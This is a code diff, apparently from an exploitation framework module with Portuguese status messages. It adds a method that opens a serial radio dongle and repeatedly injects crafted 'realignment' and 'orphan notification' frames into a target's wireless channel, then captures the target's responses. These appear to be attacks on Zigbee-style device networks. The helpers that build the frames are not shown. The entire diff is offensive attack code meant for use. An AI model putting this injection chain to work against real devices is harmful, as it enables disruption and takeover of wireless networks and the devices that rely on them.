@@ -520,3 +520,47 @@ class Exploit(Exploit):
         handler = dispatch.get(mode)
         if handler:
             handler()
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: full realignment attack chain via serial dongle."""
+        iface = str(getattr(self, "interface", "")).strip()
+        if not iface:
+            print_warning("Sem dongle configurado: skip injeção E2E")
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        ch = int(self.channel)
+        print_status("E2E: Injetando frames de realignment via dongle...")
+
+        realignment_frame = self._craft_realignment_frame()
+        if realignment_frame:
+            for _ in range(10):
+                ser.write(realignment_frame)
+                time.sleep(0.05)
+            print_success(f"Injetados 10 x realignment frames ({len(realignment_frame)} bytes cada)")
+
+        orphan_frame = self._craft_orphan_frame()
+        if orphan_frame:
+            for _ in range(5):
+                ser.write(orphan_frame)
+                time.sleep(0.1)
+            print_success("Injetados 5 x orphan notification frames")
+
+        print_status("Monitorando resposta por 10s...")
+        captured = b""
+        deadline = time.time() + 10
+        while time.time() < deadline:
+            chunk = ser.read(256)
+            if chunk:
+                captured += chunk
+
+        ser.close()
+        if captured:
+            print_success(f"Capturados {len(captured)} bytes de resposta do alvo")
